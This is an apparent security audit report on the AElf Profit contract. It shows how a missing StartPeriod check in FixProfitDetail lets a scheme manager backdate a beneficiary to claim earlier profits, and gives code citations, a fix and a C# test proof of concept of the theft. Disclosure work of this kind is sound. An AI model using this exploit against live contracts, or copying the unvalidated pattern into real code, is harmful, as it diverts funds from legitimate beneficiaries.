# Audit Report

## Title
FixProfitDetail Allows Retroactive Profit Claims Through Unconstrained StartPeriod Modification

## Summary
The `FixProfitDetail` method in the Profit contract lacks validation on the `StartPeriod` parameter, allowing scheme managers to retroactively modify when a beneficiary's profit eligibility begins. This enables beneficiaries to claim historical profits distributed before they were added to the scheme, violating the fundamental profit distribution invariant and enabling theft of funds from legitimate beneficiaries.

## Finding Description

The vulnerability exists due to missing validation in the `FixProfitDetail` method. [1](#0-0) 

When a beneficiary is legitimately added via `AddBeneficiary`, their `StartPeriod` is correctly set to ensure they only receive profits from when they joined onwards. [2](#0-1) 

However, `FixProfitDetail` allows the manager to replace the `StartPeriod` value with any arbitrary period without validation. The critical flaw is at line 299 where the new `StartPeriod` is assigned without checking that it's not earlier than the original value or when the beneficiary was actually added. [3](#0-2) 

When a beneficiary claims profits for the first time, the claiming logic sets `LastProfitPeriod` to the `StartPeriod` value. [4](#0-3) 

The `ProfitAllPeriods` method then iterates from this `LastProfitPeriod`, allowing the beneficiary to claim profits from the manipulated earlier period. [5](#0-4) 

The intended usage in production confirms that `StartPeriod` should not be modified - the Election contract never sets this parameter (leaving it at 0 to keep the original value). [6](#0-5) 

## Impact Explanation

**Direct Fund Theft**: A malicious or compromised scheme manager can add a beneficiary at period N, then call `FixProfitDetail` to set `StartPeriod` to period 1. When the beneficiary claims, they receive profits from periods 1 through N-1, stealing historical distributions that occurred before their participation.

**Dilution of Legitimate Beneficiaries**: When a beneficiary claims retroactive profits, they receive shares of distributions calculated when they weren't participating. This directly reduces the amounts that legitimate beneficiaries who were actually present during those historical periods receive, violating the share-based distribution model.

**Governance Bypass**: For DAO-controlled schemes (Treasury, Election welfare) managed by Parliament organizations, a single manager transaction can unilaterally redistribute historical profits without governance approval, bypassing the intended control mechanisms that require proposals and voting.

**Systemic Risk**: All historical accumulated profits in any scheme are vulnerable. For major schemes like Treasury citizen welfare distributions that operate over many periods, this represents significant value at risk across the entire protocol's profit distribution system.

## Likelihood Explanation

**Attack Complexity**: Extremely low - requires only a single transaction calling `FixProfitDetail` with a modified `StartPeriod` parameter. No complex state manipulation or timing requirements.

**Attacker Capabilities**: Requires scheme manager access. The key insight is this is about mis-scoped privileges rather than compromised keys. Even legitimate managers who are supposed to be trusted have unintended power to break protocol invariants. For DAO-managed schemes, this allows a manager to bypass governance controls that should limit their authority.

**Feasibility Conditions**: Only requires that the scheme has distributed profits in historical periods and the manager maintains access. These are normal operating conditions for any active profit scheme, making exploitation highly feasible.

**Detection Difficulty**: The state modification is permanent. After profits are claimed and transferred, funds cannot be recovered. While on-chain events show the claim, they don't necessarily reveal that the `StartPeriod` was manipulated to enable retroactive claiming.

## Recommendation

Add validation in the `FixProfitDetail` method to prevent retroactive modification of `StartPeriod`:

```csharp
public override Empty FixProfitDetail(FixProfitDetailInput input)
{
    // ... existing authorization checks ...
    
    // Find the detail to fix
    // ... existing lookup logic ...
    
    // Clone and update
    var newDetail = fixingDetail.Clone();
    
    // Validate StartPeriod - only allow keeping original or moving forward
    if (input.StartPeriod != 0)
    {
        Assert(input.StartPeriod >= fixingDetail.StartPeriod, 
            "Cannot set StartPeriod earlier than original value.");
        newDetail.StartPeriod = input.StartPeriod;
    }
    else
    {
        newDetail.StartPeriod = fixingDetail.StartPeriod;
    }
    
    // EndPeriod logic remains unchanged
    newDetail.EndPeriod = input.EndPeriod == 0 ? fixingDetail.EndPeriod : input.EndPeriod;
    
    profitDetails.Details.Remove(fixingDetail);
    profitDetails.Details.Add(newDetail);
    State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary] = profitDetails;
    return new Empty();
}
```

This ensures that `StartPeriod` can only be kept the same or moved forward in time, preventing retroactive profit claims while still allowing legitimate adjustments to extend or modify the end period.

## Proof of Concept

```csharp
[Fact]
public async Task FixProfitDetail_RetroactiveStartPeriod_AllowsHistoricalProfitTheft()
{
    // Setup: Create scheme and distribute profits in periods 1-3
    var creator = Creators[0];
    var schemeId = await CreateSchemeAsync();
    
    // Distribute profits in periods 1, 2, 3 (1000 tokens each)
    for (var period = 1; period <= 3; period++)
    {
        await ContributeProfits(schemeId, 1000);
        await creator.DistributeProfits.SendAsync(new DistributeProfitsInput
        {
            SchemeId = schemeId,
            Period = period,
            AmountsMap = { { ProfitContractTestConstants.NativeTokenSymbol, 1000 } }
        });
    }
    
    // Add beneficiary at period 4 (after historical distributions)
    var maliciousBeneficiary = Accounts[0].Address;
    await creator.AddBeneficiary.SendAsync(new AddBeneficiaryInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare 
        { 
            Beneficiary = maliciousBeneficiary, 
            Shares = 100 
        }
    });
    
    // Verify StartPeriod is correctly set to 4
    var detailsBefore = await creator.GetProfitDetails.CallAsync(
        new GetProfitDetailsInput { SchemeId = schemeId, Beneficiary = maliciousBeneficiary });
    detailsBefore.Details[0].StartPeriod.ShouldBe(4);
    
    // Exploit: Manager calls FixProfitDetail to set StartPeriod to 1
    await creator.FixProfitDetail.SendAsync(new FixProfitDetailInput
    {
        SchemeId = schemeId,
        BeneficiaryShare = new BeneficiaryShare 
        { 
            Beneficiary = maliciousBeneficiary, 
            Shares = 100 
        },
        StartPeriod = 1  // Retroactively set to period 1
    });
    
    // Verify StartPeriod was changed
    var detailsAfter = await creator.GetProfitDetails.CallAsync(
        new GetProfitDetailsInput { SchemeId = schemeId, Beneficiary = maliciousBeneficiary });
    detailsAfter.Details[0].StartPeriod.ShouldBe(1);  // Now starts at period 1
    
    // Beneficiary claims - should only get period 4 onwards, but gets 1-3 too
    var balanceBefore = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput 
        { 
            Owner = maliciousBeneficiary, 
            Symbol = ProfitContractTestConstants.NativeTokenSymbol 
        })).Balance;
    
    await Normal[0].ClaimProfits.SendAsync(new ClaimProfitsInput { SchemeId = schemeId });
    
    var balanceAfter = (await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput 
        { 
            Owner = maliciousBeneficiary, 
            Symbol = ProfitContractTestConstants.NativeTokenSymbol 
        })).Balance;
    
    // Beneficiary received 3000 tokens (periods 1,2,3) they shouldn't be entitled to
    var stolenAmount = balanceAfter - balanceBefore;
    stolenAmount.ShouldBe(3000);  // Stole historical profits from periods 1-3
}
```

### Citations

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L186-192)
```csharp
        var profitDetail = new ProfitDetail
        {
            StartPeriod = scheme.CurrentPeriod.Add(scheme.DelayDistributePeriodCount),
            EndPeriod = input.EndPeriod,
            Shares = input.BeneficiaryShare.Shares,
            Id = input.ProfitDetailId
        };
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L265-306)
```csharp
    public override Empty FixProfitDetail(FixProfitDetailInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        var scheme = State.SchemeInfos[input.SchemeId];
        if (Context.Sender != scheme.Manager && Context.Sender !=
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName))
        {
            throw new AssertionException("Only manager or token holder contract can add beneficiary.");
        }

        // Try to get profitDetails by Id
        var profitDetails = State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary];
        ProfitDetail fixingDetail = null;
        if (input.ProfitDetailId != null)
        {
            // In new rules, rofitDetail.Id equals to its vote id.
            fixingDetail = profitDetails.Details.SingleOrDefault(d => d.Id == input.ProfitDetailId);
        }

        if (fixingDetail == null)
        {
            // However, in the old time, profitDetail.Id is null, so use Shares.
            fixingDetail = profitDetails.Details.OrderBy(d => d.StartPeriod)
                .FirstOrDefault(d => d.Shares == input.BeneficiaryShare.Shares);
        }

        if (fixingDetail == null)
        {
            throw new AssertionException("Cannot find proper profit detail to fix.");
        }

        // Clone the old one to a new one, remove the old, and add the new.
        var newDetail = fixingDetail.Clone();
        // The startPeriod is 0, so use the original one.
        newDetail.StartPeriod = input.StartPeriod == 0 ? fixingDetail.StartPeriod : input.StartPeriod;
        // The endPeriod is set, so use the inputted one.
        newDetail.EndPeriod = input.EndPeriod == 0 ? fixingDetail.EndPeriod : input.EndPeriod;
        profitDetails.Details.Remove(fixingDetail);
        profitDetails.Details.Add(newDetail);
        State.ProfitDetailsMap[input.SchemeId][input.BeneficiaryShare.Beneficiary] = profitDetails;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L779-784)
```csharp
            var profitDetail = profitableDetails[i];
            if (profitDetail.LastProfitPeriod == 0)
                // This detail never performed profit before.
                profitDetail.LastProfitPeriod = profitDetail.StartPeriod;

            ProfitAllPeriods(scheme, profitDetail, beneficiary, maxProfitReceivingPeriodCount);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L860-861)
```csharp
            for (var period = profitDetail.LastProfitPeriod; period <= maxProfitPeriod; period++)
            {
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Elector.cs (L144-154)
```csharp
            State.ProfitContract.FixProfitDetail.Send(new FixProfitDetailInput
            {
                SchemeId = State.WelfareHash.Value,
                BeneficiaryShare = new BeneficiaryShare
                {
                    Beneficiary = electionVotingRecord.Voter,
                    Shares = electionVotingRecord.Weight
                },
                EndPeriod = endPeriod,
                ProfitDetailId = voteId
            });
```
